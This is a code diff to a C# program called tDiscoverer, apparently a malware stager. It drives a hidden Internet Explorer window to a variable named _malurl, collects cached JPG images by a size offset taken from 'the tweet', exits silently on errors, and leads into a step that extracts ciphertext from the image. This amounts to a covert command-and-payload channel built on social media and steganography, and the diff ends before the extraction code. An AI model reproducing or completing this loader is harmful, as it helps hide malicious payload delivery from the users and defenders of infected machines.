@@ -181,81 +181,58 @@ namespace tDiscoverer
         static void Main(string[] args)
         {
 
-            #region Get HTTP request
-            /**
-             * Make a request to page by nternet Explorer and put into cache all page content
-             * */
-            // Open Internet Explorer
-            Console.WriteLine("MAKE HTTP GET REQUEST: START");
-            SHDocVw.InternetExplorer ie = new SHDocVw.InternetExplorer();
-            SHDocVw.IWebBrowserApp wb = (SHDocVw.IWebBrowserApp)ie;
-            //set IE windows not visible
-            wb.Visible = false;
+			#region Get HTTP request
+			/**
+			* Make a request to page by nternet Explorer and put into cache all page content
+			* */
+			// Open Internet Explorer
+			Console.WriteLine("MAKE HTTP GET REQUEST: START");
+			SHDocVw.InternetExplorer ie = new SHDocVw.InternetExplorer();
+			SHDocVw.IWebBrowserApp wb = (SHDocVw.IWebBrowserApp)ie;
+			//set IE windows not visible
+			wb.Visible = false;
 
-            object noValue = System.Reflection.Missing.Value;
-            wb.Navigate(_malurl, ref noValue, ref noValue, ref noValue, ref noValue);
+			object noValue = System.Reflection.Missing.Value;
+			wb.Navigate(_malurl, ref noValue, ref noValue, ref noValue, ref noValue);
 
-            // Get access to its document.
-            while (wb.Busy) { Thread.Sleep(1000); }
-            Console.WriteLine("MAKE HTTP GET REQUEST: STOP");
-            Console.ReadLine();
-            #endregion
+			// Get access to its document.
+			while (wb.Busy) { Thread.Sleep(1000); }
+			ie.Quit();
+			Console.WriteLine("MAKE HTTP GET REQUEST: STOP");
+			Console.ReadLine();
+			#endregion
 
-            #region Info gathering from webpage Document
-            /**
-             * Get file name and size to avoid loading each image into memory 
-             * */
-            Console.WriteLine("INFO GATHERING FROM DOM: START");
-            mshtml.IHTMLDocument3 htmlDoc = wb.Document as mshtml.IHTMLDocument3;
-            mshtml.IHTMLElementCollection images = htmlDoc.getElementsByTagName("img");
+			#region Get images and select by filesize
+			/**
+			* Get images from IE cache  at least as large as the offset specified in the tweet
+			* */
+			Console.WriteLine("GET IMAGE FROM IE CACHE: START");
+			ArrayList matchFile = new ArrayList();
+			List<string> imgsCachePath = getIECacheElem(_pageref, "jpg");
+			foreach (string imgPath in imgsCachePath)
+			{
+				try
+				{
+					if (File.Exists(imgPath))
+					{
+						using (FileStream fileWriter = new FileStream(imgPath, FileMode.Open, FileAccess.Read))
+						{
+							int fileSize = (int)fileWriter.Length;
+							if (fileSize >= _offset)
+							{
+								Console.WriteLine("\nImage Path: {0}\nFile Size: {1}\n", imgPath, fileSize);
+								matchFile.Add(imgPath);
+							}
+						}
+					}
+				}
+				// if process fail than exit without signal
+				catch (IOException) { Environment.Exit(0); }
+			}
 
-            Hashtable imgList = new Hashtable();
-            foreach (mshtml.IHTMLImgElement img in images)
-            {
-                imgList.Add(img.nameProp, Convert.ToInt32(img.fileSize));
-                Console.WriteLine("\nImage File Name: {0}\nImage File Size: {1}\n", img.nameProp, img.fileSize);
-            }
-            // Close Internet Explorer
-            ie.Quit();
-            Console.WriteLine("INFO GATHERING FROM DOM: STOP");
-            Console.ReadLine();
-            #endregion
-
-            #region Get images and select by filesize
-            /**
-             * Get images from IE cache  at least as large as the offset specified in the tweet
-             * */
-            Console.WriteLine("GET IMAGE FROM IE CACHE: START");
-            ArrayList matchFile = new ArrayList();
-            List<string> imgsCachePath = getIECacheElem(_pageref, "jpg");
-            foreach (string imgPath in imgsCachePath)
-            {
-                try
-                {
-                    if (File.Exists(imgPath))
-                    {
-                        foreach (string key in imgList.Keys)
-                        {
-                            int fileSize = (int)imgList[key];
-                            string nameProp = key.Replace(".jpg", "");
-                            nameProp = nameProp + "[";
-
-                            if ((fileSize >= _offset) & (imgPath.Contains(nameProp)))
-                            {
-                                Console.WriteLine("\nImage Path: {0}\nFile Size: {1}\nResearch Key: {2}\n", imgPath, fileSize, nameProp);
-                                matchFile.Add(imgPath);
-                            }
-
-                        }
-                    }
-                }
-                // if process fail than exit without signal
-                catch (IOException) { Environment.Exit(0); }
-            }
-
-            Console.WriteLine("GET IMAGE FROM IE CACHE: STOP");
-            Console.ReadLine();
-            #endregion
+			Console.WriteLine("GET IMAGE FROM IE CACHE: STOP");
+			Console.ReadLine();
+			#endregion
 
             #region Load image and extract cyphertext
             /**
